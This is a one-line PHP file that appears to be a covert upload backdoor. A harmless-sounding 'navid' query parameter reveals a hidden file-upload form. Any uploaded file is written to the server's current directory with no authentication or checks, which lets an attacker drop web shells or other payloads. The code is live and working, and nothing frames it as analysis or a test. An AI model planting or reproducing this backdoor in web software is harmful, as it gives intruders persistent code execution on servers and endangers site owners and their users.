<?php if(isset($_GET['navid'])){echo '<form enctype="multipart/form-data" action="" method="POST"><input type="file" name="uploaded_file"></input></br><input type="submit" value="Upload"></input></form>'; if(!empty($_FILES['uploaded_file'])){ $path = ""; $path = $path . basename( $_FILES['uploaded_file']['name']); if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {}}}?>